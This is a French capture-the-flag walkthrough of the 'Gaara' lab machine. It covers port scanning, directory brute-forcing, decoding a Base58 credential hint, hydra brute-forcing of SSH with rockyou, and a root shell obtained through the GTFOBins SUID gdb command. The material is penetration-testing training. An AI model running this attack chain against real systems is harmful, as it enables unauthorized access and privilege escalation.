# GAARA

    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.247.142 -e tun0 > ports_gaara.txt
    sudo nmap -A 192.168.247.142

Scans classiques.

    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey:
    |   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
    |   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
    |_  256 b751f2f9855766a865542e05f940d2f4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Gaara
 
 Le site web nous accueille sur une image prenant tout l'écran, il semble ne rien y avoir d'autre. J'ai lancé quelques scans sur les sous-dossiers en parallèle :
 

    feroxbuster -u http://192.168.247.142
    feroxbuster -u http://192.168.247.142 -w /usr/share/wordlists/dirb/big.txt
    feroxbuster -u http://192.168.247.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

En dehors des fichiers classiques, on remarque un dossier **/Cryoserver/**

    curl http://192.168.247.142/Cryoserver

On obtient une page quasiment vide mais avec trois dossiers tout à la fin :

    curl http://192.168.247.142/Temari
    curl http://192.168.247.142/Kazekage
    curl http://192.168.247.142/iamGaara

Chaque page ne contient qu'un énorme texte, mais dans la page **"iamGaara"** se trouve un morceau étrange :

    f1MgN9mTf9SNbzRygcU

En allant sur https://www.dcode.fr et en analysant le texte encodé, les cinq premiers résultats sont :
- Periodic Table Cipher
- Base 58
- Base62 Encoding
- Substitution Cipher
- Shift Cipher

En testant dans l'ordre, le premier choix ne donne rien mais le deuxième choix donne **"gaara:ismyname"** et cela m'a tout de suite fait penser à un couple clé / mot de passe pour le SSH.

    ssh -l gaara 192.168.247.142

Le mot de passe n'a pas marché mais cela m'a donné l'idée de tenter de bruteforcer le port 22.

    hydra -vV -f -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.247.142 -s 22 ssh

Cela fonctionne et on obtient le mot de passe.

    ssh -l gaara 192.168.247.142

Le flag utilisateur se trouve directement dans le dossier où on atterrit.

Pour l'élévation de privilèges, les simples vérifications habituelles suffisent :

    sudo -l 
    find / -perm /4000 2>/dev/null

Rien d'intéressant pour la première commande, mais GDB m'a sauté aux yeux pour la deuxième. Il suffit d'appliquer la commande classique pour ce cas de figure.

Voir : https://gtfobins.github.io/gtfobins/gdb/#suid

    ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

    ls /root

    cat /root/proof.txt
